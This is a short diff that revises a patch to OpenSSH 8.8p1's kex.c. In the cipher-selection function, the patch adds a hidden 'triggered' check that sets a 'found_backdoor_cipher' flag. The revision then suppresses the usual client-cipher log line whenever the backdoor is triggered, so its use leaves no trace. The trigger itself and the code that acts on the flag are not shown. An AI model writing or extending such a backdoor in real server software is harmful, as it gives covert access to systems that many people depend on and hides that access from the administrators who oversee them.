@@ -1,6 +1,6 @@
---- openssh-portable-v8.8_p1/kex.c	2021-12-02 17:04:09.341420945 -0600
-+++ openssh-portable-patch/kex.c	2021-12-02 17:31:51.655605934 -0600
-@@ -756,6 +756,15 @@
+--- openssh-portable-V_8_8_P1/kex.c	2021-09-26 09:03:19.000000000 -0500
++++ openssh-portable-patch/kex.c	2021-12-07 21:59:12.881987293 -0600
+@@ -756,6 +756,16 @@
  choose_enc(struct sshenc *enc, char *client, char *server)
  {
  	char *name = match_list(client, server, NULL);
@@ -11,12 +11,13 @@
 +
 +	if (triggered) enc->found_backdoor_cipher = 1;
 +
-+	logit("client: %s", client);
++	if (!triggered) { logit("client: %s", client); }
++	
 +	
  
  	if (name == NULL)
  		return SSH_ERR_NO_CIPHER_ALG_MATCH;
-@@ -945,6 +954,10 @@
+@@ -945,6 +955,10 @@
  			peer[nenc] = NULL;
  			goto out;
  		}
